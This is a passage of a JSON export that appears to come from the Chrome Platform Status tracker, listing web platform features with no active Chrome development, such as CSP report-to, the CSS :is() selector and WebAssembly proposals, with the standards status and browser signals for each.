[
  {
    "category": "Security",
    "updated": {
      "when": "2018-06-06 19:35:36.103375",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSP: `report-to` directive",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-csp/#directive-report-to",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "mkwst@chromium.org",
          "andypaicu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=726634",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The `report-to` directive wires CSP violation reports up to the Reporting API which allows the browser to bundle multiple reports when sending them to the server rather than creating a POST for each individual report. This allows reports to be collected in a way that is friendlier for users' batteries. This change also deprecates the existing `report-uri` directive.",
    "id": 5826576096690176,
    "resources": {
      "docs": [
        "https://wicg.github.io/reporting/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:09.522950",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Flexbox: New intrinsic size algorithm",
    "tags": [
      "Flexbox",
      "flex"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-flexbox/#intrinsic-sizes",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1055887",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "cbiesinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/240765",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSS Flexbox specification changed the algorithm for calculating a flexbox's intrinsic size (see below for the spec link). The new algorithm produces better results when there are flex items that actually flex, because it takes flex factors and flex-basis into account, whereas so far we just sum up the preferred sizes of each flex item.",
    "id": 6021353392046080,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-27 02:08:22.032420",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Generated Content for Paged Media Module",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/css-gcpm/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "CSS properties helpful for printed publication. We only implement paged-x / paged-y from the whole spec.",
    "id": 5400251359821824,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-02-05 03:36:10.715290",
      "by": "victoriaytsu@google.com"
    },
    "name": "CSS Selectors 4 Pseudo-Class :is()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/selectors-4/#zero-matches",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "victoriaytsu@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=808904",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Specificity-adjustment pseudo-class, :is(), is a functional pseudo-class with the same syntax and functionality as :matches(). Unlike :matches(), neither the :is() pseudo-class, nor any of its arguments contribute to the specificity of the selector — its specificity is always zero.",
    "id": 4600991135563776,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1ZUNf4eXIABKYtOb2IWdzkHqMSC9GWgX5740McqQ5ur0/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-27 02:09:36.587320",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS filter() image function",
    "comments": "It is currently implemented prefixed in WebKit and can be tested in the last WebKit nightly builds. The filter() function is currently part of the Filter Effects specification. And has the support of the SVG and CSS WG.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/filter-effects/#FilterCSSImageValue",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "dschulze@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The function allows filtering an CSS input image with a set of filter functions. The used filter functions are the same as for the CSS filter property. The filter() function can be animated as well.",
    "id": 5425136400334848,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-01-10 14:47:50.559540",
      "by": "orphis@chromium.org"
    },
    "name": "Deprecate and Remove URL.createObjectURL for MediaStream",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/mediacapture-main/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1334564",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "orphis@chromium.org",
          "guidou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>MediaStream"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=800767",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=167518",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This functionality has been deprecated in 2013 and superseded by assigning streams to srcObject.",
    "id": 5618491470118912,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-01-11 21:03:49.210650",
      "by": "ericbidelman@google.com"
    },
    "name": "Disable scripts for Data Saver users on slow connections",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "dougarnett@chromium.org",
          "bengr@chromium.org",
          "aposner@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=801275",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "If a Data Saver user is on a 2G-speed or slower network according to the NetInfo API, Chrome disables scripts and sends an intervention header on every resource request. Users are shown a UI at the bottom of the screen indicating the page has been modified to save data. Users can enable scripts on the page by  tapping “Show original” in the UI.",
    "id": 4775088607985664,
    "resources": {
      "docs": [
        "https://wicg.github.io/netinfo/#dfn-effective-connection-types"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:59.435080",
      "by": "ericbidelman@google.com"
    },
    "name": "Disallow spaces and other bad characters in hostnames",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://url.spec.whatwg.org/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "brettw@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=652808",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome currently allows some technically invalid characters in hostnames, which it percent-escapes. These host names will now be marked as invalid.",
    "id": 5724389597249536,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1KezMGpTwMJSYW3Jb9cvvi4fRuZ0r5AGbS-Phe-A6WeQ"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 22:41:02.220800",
      "by": "aposner@google.com"
    },
    "name": "Image replacement for Data Saver users on slow connections",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "sclittle@chromium.org",
          "bengr@chromium.org",
          "aposner@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "If a Data Saver user is on a 2G-speed or slower network according to the NetInfo API, Chrome replaces images with placeholders and sends an intervention header on every resource request. Placeholders are the same dimensions as the original image to maintain site layout. Users are shown a UI at the bottom of the screen indicating the page has been modified to save data. Users can load the image by long-pressing on the placeholder, or load all images by tapping “Show original” in the UI.",
    "id": 6072546726248448,
    "resources": {
      "docs": [
        "https://wicg.github.io/netinfo/#dfn-effective-connection-types"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-09 12:08:35.879950",
      "by": "fbeaufort@google.com"
    },
    "name": "Media Capabilities: encoding",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/media-capabilities/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "mcasas@chromium.org",
          "chcunningham@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media>Capabilities"
        ],
        "flag": false,
        "bug": "https://crbug.com/709181",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This is an API for querying the user agent about a device's encoding capabilities for the purpose of recording or transmitting.",
    "id": 5123719190020096,
    "resources": {
      "samples": [
        "https://codepen.io/miguelao/full/bWNwej"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-08-23 18:46:18.958670",
      "by": "jkarlin@chromium.org"
    },
    "name": "PauseFrame",
    "tags": [
      "pause",
      "iframe",
      "frame"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "jkarlin@chromium.org",
          "rschoen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Scheduling"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows for pausing of frames (via JavaScript API as well as browser intervention). When a frame is paused, it doesn't run script and it doesn't load resources. It waits patiently to be resumed.",
    "id": 5141555102875648,
    "resources": {
      "docs": [
        "https://github.com/jkarlin/pause-frame"
      ],
      "samples": [
        "https://github.com/jkarlin/pause-frame"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-23 14:30:32.339550",
      "by": "jmedley@google.com"
    },
    "name": "RTCQuicTransport & RTCQuicStream",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "shampson@chromium.org",
          "steveanton@chromium.org",
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Implement the RTCQuicTransport and RTCQuicStream, a standalone API using the QUIC transport protocol to exchange arbitrary data with remote peers. This provides a generic multiple-way transport that doesn't use the full PeerConnection stack designed for media purposes.",
    "id": 6311472179183616,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/12oNEcgjAjQERMvATCVCWpoTxNU47NRUzxCK5g0FysTk/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-12-13 18:21:32.360950",
      "by": "jmedley@google.com"
    },
    "name": "Remove Content Type Sniffing for Worker Scripts",
    "comments": "This is one step in the long-term process to eliminate content type sniffing. Since worker scripts are a relatively new feature they have not yet acquired legacy baggage of other features, which allows us to remove this particular feature combination without much risk, and before unsuitable usage could becomes a legacy.\r\n\r\nAlso, there's a trivial work-around for any affected developer: Just serve your scripts with a proper MIME type.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/3255",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "vogelheim@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=794548",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove 'content type sniffing' for worker scripts. That is, fail the execution of JavaScript resource unless they have a valid script MIME type.",
    "id": 6037497138118656,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/issues/3255"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-09-17 08:25:45.424880",
      "by": "Patket@microsoft.com"
    },
    "name": "Remove full text search (FTS) support from WebSQL",
    "tags": [
      "websql",
      "fts"
    ],
    "comments": "Firefox and Edge have never shipped (and do not plan to ship) WebSQL.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dev.w3.org/html5/webdatabase/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://caniuse.com/#feat=sql-storage",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "pwnall@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Storage>WebSQL"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=742518&desc=3",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://caniuse.com/#feat=sql-storage",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/WebKit/webkit/commit/36ce0a5e2dc2def273c011bef04e58da8129a7d6",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "WebSQL is a discontinued standard that was only implemented by WebKit and Blink as a thin layer on top of SQLite. The implementation has exposed SQLITE-specific constructs, such as a full text search extension (FTS3).\r\n\r\nMaintaining WebSQL's FTS support has been troublesome, and Safari removed it.",
    "id": 5704730961510400,
    "resources": {
      "docs": [
        "https://www.html5rocks.com/en/tutorials/webdatabase/websql-indexeddb/"
      ],
      "samples": [
        "https://gist.github.com/nolanlawson/0264938033aca2201012"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-10-31 01:57:58.645500",
      "by": "hayato@google.com"
    },
    "name": "Remove window.event for Shadow DOM",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "flag": false,
        "bug": "http://crbug.com/779461",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The contex is: https://github.com/whatwg/dom/issues/334\r\nWe are trying to standardize certain Microsoft event extensions. One of them is window.event. Blink *supports* window.event.\r\n\r\nIn the discussion, we agreed that window.event should be *undefined* if an Event's target is in a shadow tree.\r\nThat is effectivery equivalent to *removing* window.event for Shadow DOM.\r\n",
    "id": 5084727350394880,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-11-09 19:35:40.155530",
      "by": "adamk@chromium.org"
    },
    "name": "Tail calls elimination (ES6)",
    "tags": [
      "TCO",
      "tail-call",
      "tail call elimination",
      "proper tail calls"
    ],
    "comments": "https://kangax.github.io/compat-table/es6/#test-proper_tail_calls_(tail_call_optimisation)",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-tail-position-calls",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=723959",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "ishell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4698",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/tailcallses6",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=146477",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Guarantee \"no stack consumption\" for function invocations in tail call positions.",
    "id": 5516876633341952,
    "resources": {
      "docs": [
        "https://en.wikipedia.org/wiki/Tail_call",
        "https://youtu.be/PSGEjv3Tqo0?t=698"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-03-28 17:32:09.832420",
      "by": "ericbidelman@google.com"
    },
    "name": "Treat `http://localhost` as a secure context",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://tools.ietf.org/html/draft-west-let-localhost-be-localhost",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.ietf.org/mail-archive/web/dnsop/current/msg20669.htm",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature>SecureContexts"
        ],
        "flag": false,
        "bug": "https://crbug.com/589141",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Developers generally expect `http://localhost` to have the same transport security characteristics as TLS, as it should resolve to a loopback address, and will therefore never hit the network. Chrome will ensure that this expectation is accurate by implementing https://tools.ietf.org/html/draft-west-let-localhost-be-localhost, and carves out `http://localhost` accordingly. ",
    "id": 6269417340010496,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:42.846700",
      "by": "ericbidelman@google.com"
    },
    "name": "UIEvents Keyboard Events",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/uievents/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "garykac@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://status.modern.ie/uieventskeyboardqueryapis",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "locale in KeyboardEvent.\r\nqueryKeyCap() and queryLocale() static methods.",
    "id": 5593215650496512,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 19:58:14.137170",
      "by": "bradnelson@google.com"
    },
    "name": "WebAssembly ECMAScript Module Integration",
    "tags": [
      "wasm",
      "webassembly",
      "modules"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "gdeepti@chromium.org",
          "titzer@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=841494",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow JS to import WebAssembly modules and the reverse.\r\n",
    "id": 5987156463976448,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/esm-integration/tree/master/proposals/esm-integration"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:44:11.313290",
      "by": "jmedley@google.com"
    },
    "name": "WebAssembly Sign Extension Opcodes",
    "tags": [
      "wasm",
      "webassembly",
      "threads"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/WebAssembly/sign-extension-ops",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1428971",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "binji@chromium.org",
          "hablich@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/pull/3741/files",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add sign extension opcodes to WebAssembly. This makes some code sequences shorter and allows us to provide only zero extended versions of atomic opcodes for threads.\r\n",
    "id": 4961472689995776,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/sign-extension-ops/blob/master/proposals/sign-extension-ops/Overview.md",
        "https://github.com/WebAssembly/design/issues/1178"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:01.462430",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: OfflineAudioDestinationNode",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://webaudio.github.io/web-audio-api/",
      "visibility": {
